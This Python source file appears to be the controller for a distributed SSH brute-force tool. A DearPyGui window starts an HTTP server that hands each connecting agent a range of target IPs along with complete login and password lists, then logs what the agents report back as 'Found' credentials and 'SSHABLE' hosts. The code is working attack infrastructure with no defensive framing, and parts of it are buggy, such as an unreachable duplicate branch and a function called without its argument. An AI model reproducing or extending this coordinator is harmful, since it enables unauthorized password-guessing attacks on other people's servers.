from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer
import dearpygui.dearpygui as dpg
import json
from dearpygui_ext.logger import mvLogger
import threading
from urllib.parse import urlparse, parse_qs

class Agent:
  def __init__(self, address, begin, end, number):
    self.address = address
    self.begin = begin
    self.end = end
    self.number = number
    

def set_table_data():
    print (agent_list)
    for tag in dpg.get_item_children("__table")[1]:
        dpg.delete_item(tag)
    for i in agent_list:
        with dpg.table_row(parent="__table"):
                dpg.add_text(i.number)
                dpg.add_text(i.address)
                val=str(i.begin)+"/"+str(i.end)
                print(val)
                dpg.add_text(val)


counter = 0
agent_list = []
ips_range=50
ips_range=50
num=1
state=False
passFile=""
ipsFile=""
loginFile=""


class HttpGetHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        global num
        try:
            print("mess")
            global counter
            global log
            query = urlparse(self.path).query
            print(query)
            params = dict(qc.split("=") for qc in query.split("&"))
            print(params['1'])
            if params['1'] == 'Found':
                params["2"]
                val=params["2"].replace("+", " ")
                log.log(val)
            if params['1'] == 'SSHABLE':
                val=params["2"].replace("+", " ")
                log.log(val)
        except Exception as inst:
            print(inst)
        finally:
            self.send_response(200)
            self.send_header('content-type','text/html')
            self.end_headers()
            self.wfile.write(b"ok")
    def do_GET(self):
        global num
        try:
            global counter
            global log
            i = self.path.index ( "?" ) + 1
            params = dict ( [ tuple ( p.split("=") ) for p in self.path[i:].split ( "&" ) ] )
            if params['1'] == 'begin':
                if counter == 0:
                    log.log("Got agent connection on "+ self.headers.get('host'))
                    agent_list.append(Agent(self.headers.get('host'),0,ips_range,1))
                    print(agent_list[-1])
                    ips,logins,passwds=getdata(agent_list[-1])
                    sendData=[]
                    sendData.append(num)
                    sendData.append(ips)
                    sendData.append(logins)
                    sendData.append(passwds)
                    sendData.append(0)
                    json_str = json.dumps(sendData)
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.send_header("Content-Length", str(len(json_str)))
                    self.end_headers()
                    self.wfile.write(str(json_str).encode('utf8'))
                else:
                    log.log("Got agent connection on "+ self.headers.get('host'))
                    agent_list.append(Agent(self.headers.get('host'),agent_list[-1].end+1,agent_list[-1].end+1+ips_range,agent_list[-1].number+1))
                    ips,logins,passwds=getdata()
                    sendData=[]
                    sendData.append(num)
                    sendData.append(ips)
                    sendData.append(logins)
                    sendData.append(passwds)
                    sendData.append(0)
                    json_str = json.dumps(sendData)
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.send_header("Content-Length", str(len(json_str)))
                    self.end_headers()
                    self.wfile.write(str(json_str).encode('utf8'))
                counter=counter+1
                num+=1
                set_table_data()
            elif params["1"] == 'end':
                for i, o in enumerate(agent_list):
                    print(o.number,int(params['2']))
                    if(o.number==int(params['2'])):
                        del agent_list[i]
                        break
                counter=counter-1
                set_table_data()
            elif params["1"] == 'end':
                for i, o in enumerate(agent_list):
                    print(o.number,int(params['2']))
                    if(o.number==int(params['2'])):
                        del agent_list[i]
                        agent_list.append(Agent(self.headers.get('host'),agent_list[-1].end+1,agent_list[-1].end+1+ips_range,agent_list[-1].number+1))
                        break
                counter=counter-1
                set_table_data()
                num+=1
            else: 
                "unsupported request"
        except Exception as inst:
            print(inst)
        

def getdata(data):
    print(data.number)
    global ips_range
    ips_range=dpg.get_value(slider_float2)
    f0 = open("ips", "r")
    print(type(ips_range),ips_range)
    ips = f0.read().splitlines()
    fin_ips = ips[(data.number-1)*int(ips_range):data.number*int(ips_range)]
    print(fin_ips)
    f0.close()
    f1 = open("logins", "r")
    logins = f1.read().splitlines()
    f1.close()
    f2 = open("passwds", "r")
    passwds = f2.read().splitlines()
    f2.close()
    return fin_ips,logins,passwds


def run_server(server_class=HTTPServer, handler_class=HttpGetHandler):
  global log
  log.log_info("Server starting")
  print(dpg.get_value("_ip_data"))
  print(dpg.get_value("_port_data"))
  server_address = (dpg.get_value("_ip_data"), int(dpg.get_value("_port_data")))
  httpd = server_class(server_address, handler_class)
  try:
      httpd.serve_forever()
  except KeyboardInterrupt:
      httpd.server_close()

import dearpygui.dearpygui as dpg


log=0 
dpg.create_context()

def button_callback(sender, app_data, user_data):
    global state
    if(state==False):
        ips_range=dpg.get_value("_ip_data")
        thread = threading.Thread(target=run_server, args=(), daemon=True)
        thread.start()
        state=True

with dpg.window(tag="__logger",pos=(400,200), width=385, height=400,no_move=True,no_resize=True, no_title_bar=True):
    log = mvLogger(dpg.get_alias_id("__logger") )
# dpg.set_viewport_pos("logger##standard", 0,0)
with dpg.window(label="",pos=(400,0), width=385,no_move=True, height=200,no_resize=True, no_title_bar=True):
    
    with dpg.table(header_row=True,tag="__table", borders_innerH=True, borders_outerH=True, borders_innerV=True,
                   borders_outerV=True):
        dpg.add_table_column(label="Agent number")
        dpg.add_table_column(label="IP")
        dpg.add_table_column(label="Range of ips")
        with dpg.table_row():
                for j in range(0, 3):
                    dpg.add_text(f"Row 1 Column{j}")
        set_table_data()
        
def callback(sender, app_data, user_data):
    global loginFile
    global passFile
    global ipsFile
    if(app_data['file_name']!='.*'):
        if(sender=="file_dialog_id1"):
            try:
                val=app_data['selections']
                x=val.values()
                f1 = open(list(x)[0], "r")
                f1.close()
                loginFile=list(x)[0]
                log.log_info("List of Logins successfully found")
            except Exception as ex:
                log.log_error("Can`t add file")
        if(sender=="file_dialog_id2"):
            try:
                val=app_data['selections']
                x=val.values()
                f1 = open(list(x)[0], "r")
                f1.close()
                passFile=list(x)[0]
                log.log_info("List of Passwords successfully found")
            except Exception as ex:
                log.log_error("Can`t add file")
        if(sender=="file_dialog_id3"):
            try:
                val=app_data['selections']
                x=val.values()
                f1 = open(list(x)[0], "r")
                f1.close()
                ipsFile =list(x)[0]
                log.log_info("List of IPs successfully found")
            except Exception as ex:
                log.log_error("Can`n add file")



with dpg.file_dialog(directory_selector=False, show=False, callback=callback, id="file_dialog_id1", width=700 ,height=400):
    dpg.add_file_extension(".*")
    dpg.add_file_extension("", color=(150, 255, 150, 255))

with dpg.file_dialog(directory_selector=False, show=False, callback=callback, id="file_dialog_id2", width=700 ,height=400):
    dpg.add_file_extension(".*")
    dpg.add_file_extension("", color=(150, 255, 150, 255))

with dpg.file_dialog(directory_selector=False, show=False, callback=callback, id="file_dialog_id3", width=700 ,height=400):
    dpg.add_file_extension(".*")
    dpg.add_file_extension("", color=(150, 255, 150, 255))

with dpg.window(label="Tutorial", width=400, height=600,no_move=True,no_resize=True, no_title_bar=True):
    btn = dpg.add_button(label="Start server", )
    dpg.set_item_callback(btn, button_callback)
    dpg.set_item_user_data(btn, "Some Extra User Data")

    slider_float2 = dpg.add_slider_int(
        
        label="Range of ips",
        default_value=ips_range,
    )
    
    input_ip = dpg.add_input_text(
        label="Server IP",
        tag="_ip_data",
        default_value="127.0.0.1"
    )    
    input_ip = dpg.add_input_text(
        label="Server Port",
        tag="_port_data",
        default_value="8000"
    )  
    with dpg.group(horizontal=True):
        dpg.add_button(label="Select Logins", callback=lambda: dpg.show_item("file_dialog_id1"))
        dpg.add_button(label="Select Passwords", callback=lambda: dpg.show_item("file_dialog_id2"))
        dpg.add_button(label="Select IPs", callback=lambda: dpg.show_item("file_dialog_id3"))

        

dpg.create_viewport(title='Server Starter', width=800, height=640,resizable=False)
dpg.setup_dearpygui()
dpg.show_viewport()
dpg.start_dearpygui()
dpg.destroy_context()
